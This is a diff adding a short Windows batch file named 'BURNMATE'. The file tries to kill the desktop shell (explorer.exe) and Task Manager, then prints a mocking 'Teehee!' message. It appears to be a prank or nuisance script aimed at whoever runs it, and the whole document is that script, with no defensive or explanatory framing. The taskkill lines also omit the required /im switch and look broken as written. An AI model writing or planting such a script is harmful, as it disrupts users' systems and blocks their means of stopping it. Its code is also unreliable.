@@ -1,0 +1,5 @@
+@echo off
+taskkill explorer.exe
+taskkill taskmgr
+title BURNMATE
+echo Teehee! BURNMATE!
